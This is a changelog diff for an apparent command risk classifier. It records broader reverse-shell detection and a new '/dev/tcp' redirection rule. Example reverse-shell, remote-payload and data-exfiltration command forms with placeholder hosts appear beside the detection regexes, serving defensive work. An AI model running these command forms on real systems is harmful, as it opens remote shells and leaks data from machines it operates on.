@@ -4,6 +4,47 @@
 
 (no entries — next release window)
 
+## [1.10.120] - 2026-05-03
+
+**Reverse-shell coverage closed**: the existing `reverse-shell`
+rule only fired on `bash -i ... /dev/tcp/...`. Six other
+canonical reverse-shell forms — `sh -i`, `zsh -i`, `fish -i`,
+`ksh -i`, `bash >& /dev/tcp/...` (no `-i`), and raw FD
+redirection without any shell wrapper — all classified LOW.
+This release extends the existing rule and adds a sibling
+`devtcp-redirect` rule.
+
+### Changed
+- **`reverse-shell`** regex extended from `\bbash\s+-i\b` to
+  `\b(?:bash|sh|zsh|fish|ksh)\s+(?:-[a-zA-Z]+\s+)*` so all
+  five common shell wrappers match, with or without the
+  interactive flag. Rationale: `bash >& /dev/tcp/host/port
+  0>&1` (no `-i`) is still a reverse shell, just
+  non-interactive — the `-i` constraint was an
+  over-specification that left the no-`-i` form silent.
+
+### Added
+- **`PATTERN_CATALOG.critical`** entry `devtcp-redirect`. Catches
+  raw bash `/dev/tcp/<host>/<port>` redirection that doesn't
+  flow through a shell wrapper:
+  ```
+  cat < /dev/tcp/host/port            read remote payload to stdin
+  exec 196<>/dev/tcp/host/port        persistent socket FD
+  echo cmd > /dev/tcp/host/port       data exfil to TCP socket
+  (echo >/dev/tcp/h/p) 2>/dev/null    port-check disguise
+  ```
+  Critical tier — there's no benign use of bash's /dev/tcp
+  emulation in production worker context. Admins who want a
+  port check should use `nc -zv` or invoke bash explicitly
+  with operator review.
+- **`tests/risk-classifier.test.js`**: 3 new `it()` cases —
+  one for the `reverse-shell` extension (7 attack shells
+  including the original `bash -i` regression), one for
+  `devtcp-redirect` raw FD forms (5 shells), and one
+  regression case that incidental "/dev/tcp" mentions
+  (documentation, listing, grep) don't fire. Suite stays at
+  175. Risk-classifier file 168 → 171 cases.
+
 ## [1.10.119] - 2026-05-03
 
 **Catalog gap closed**: drop-in config directory writes
